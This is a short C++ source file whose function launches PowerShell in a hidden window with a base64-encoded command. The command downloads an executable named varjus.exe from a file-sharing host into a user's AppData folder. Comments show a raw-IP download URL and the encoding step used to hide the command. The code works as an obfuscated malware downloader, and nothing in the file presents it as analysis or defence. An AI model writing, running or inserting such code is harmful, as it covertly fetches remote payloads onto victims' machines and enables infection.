#include "pwsh.h"

//Invoke-WebRequest -Uri 'http://16.170.254.129/paska.jpg'-OutFile "$env:APPDATA\paska.jpg"

//[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Invoke-WebRequest -Uri 'http://16.170.254.129/paska.jpg'-OutFile '$env:APPDATA\paska.jpg'"))

//https://cdn-129.anonfiles.com/lbZ8Dal4yb/e63036c2-1653981103/varjus.exe

void PS::pwsh(std::string path, bool* var)
{
	*var = !*var;
	std::string powershell = "powershell.exe";
	std::string launch_settings = " -WindowStyle hidden ";
	std::string script = powershell + launch_settings + "-encodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcABzADoALwAvAGMAZABuAC0AMQAyADkALgBhAG4AbwBuAGYAaQBsAGUAcwAuAGMAbwBtAC8AbABiAFoAOABEAGEAbAA0AHkAYgAvAGUANgAzADAAMwA2AGMAMgAtADEANgA1ADMAOQA4ADEAMQAwADMALwB2AGEAcgBqAHUAcwAuAGUAeABlACAAJwBDADoAXABVAHMAZQByAHMAXABNAGEAdABpAGEAcwBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwAdgBhAHIAagB1AHMALgBlAHgAZQAnAA";
	ShellExecuteA(NULL, "open", "powershell.exe", script.c_str(), NULL, SW_SHOWNORMAL);
}